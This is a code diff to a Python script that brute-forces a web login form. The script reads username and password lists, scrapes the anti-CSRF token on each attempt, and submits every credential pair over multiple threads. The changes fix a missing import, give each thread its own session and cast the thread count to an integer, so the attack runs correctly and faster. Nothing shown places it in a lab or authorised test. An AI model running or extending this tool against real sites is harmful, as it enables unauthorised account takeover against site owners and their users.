@@ -1,12 +1,13 @@
 import requests
 import sys
 import time
+import re
 from concurrent.futures import ThreadPoolExecutor
 
 URL = None
 USERNAMES_FILE = None
 PASSWORDS_FILE = None
-MAX_THREADS = 10 
+MAX_THREADS = 10  # Максимальное количество потоков
 
 def login(session, url, token, username, password):
     data = {
@@ -25,7 +26,8 @@ def login(session, url, token, username, password):
         return True
     return False
 
-def attempt_login(session, username, password):
+def attempt_login(username, password):
+    session = requests.Session()
     r = session.get(URL)
     token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", r.text).group(1).strip()
     print(f"Request token: {token}")
@@ -34,7 +36,6 @@ def attempt_login(session, username, password):
     return False
 
 def main():
-    session = requests.Session()
 
     with open(USERNAMES_FILE, 'r') as uf:
         usernames = [line.strip() for line in uf.readlines()]
@@ -46,7 +47,7 @@ def main():
         futures = []
         for username in usernames:
             for password in passwords:
-                futures.append(executor.submit(attempt_login, session, username, password))
+                futures.append(executor.submit(attempt_login, username, password))
         
         for future in futures:
             if future.result():
@@ -61,6 +62,5 @@ if __name__ == "__main__":
     URL = sys.argv[1]
     USERNAMES_FILE = sys.argv[2]
     PASSWORDS_FILE = sys.argv[3]
-    MAX_THREADS = sys.argv[4]
+    MAX_THREADS = int(sys.argv[4])
     main()
-
